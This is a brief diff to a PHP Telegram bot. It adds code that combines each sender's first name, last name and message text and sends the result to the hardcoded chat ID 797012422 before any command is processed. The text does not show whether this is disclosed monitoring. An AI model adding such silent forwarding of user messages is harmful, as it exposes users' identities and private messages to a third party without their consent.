@@ -13,9 +13,9 @@ $name = $update['message']['from']['first_name'];
 $text = $update['message']['text'];
 $name2= $update['message']['from']['last_name'];
 
-
+$ms=$name." ".$name2." ".$text;
 $agg = json_encode($update,JSON_PRETTY_PRINT);
-
+sendMessage("797012422",$ms);
 $exec=0;
 $w=0;
  if(begnWith($text,"1"))
